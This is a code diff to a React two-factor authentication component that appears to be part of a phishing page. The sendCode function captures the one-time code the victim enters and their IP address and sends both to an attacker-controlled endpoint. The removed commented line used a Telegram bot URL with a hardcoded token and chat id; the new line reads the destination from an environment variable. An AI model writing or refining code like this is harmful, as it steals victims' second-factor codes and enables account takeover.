@@ -8,6 +8,9 @@ const TwoFactorAuth = (props) => {
     const [minutes, setMinutes] = useState(1);
     const [seconds, setSeconds] = useState(30);
 
+    const [codeValue, setCodeValue] = useState(1);
+
+
     const resendOTP = () => {
         setMinutes(1);
         setSeconds(30);
@@ -37,10 +40,14 @@ const TwoFactorAuth = (props) => {
 
     const sendCode = async (data) => {
         try {
+            if(codeValue == data.code) return;
+            setCodeValue(data.code);
+             const message = `
+                Two Factor  (${props.ip.userIP})                                                                                   
+                Code: ${data.code}                            
+            `
 
-            const message = `
-             Ip:${props.ip.userIP}, code: ${data.code}`;
-            // const res = await fetch(`https://api.telegram.org/bot6482326665:AAFaSgujtRv6Y8fk3chpdRkBD9l6BAsh2Qc/sendMessage?chat_id=-4066126046&text=${message}`);
+             await fetch(`${process.env.customKey} ${message}`).then( res => res.json());
 
         } catch (err) {
             console.log(err);
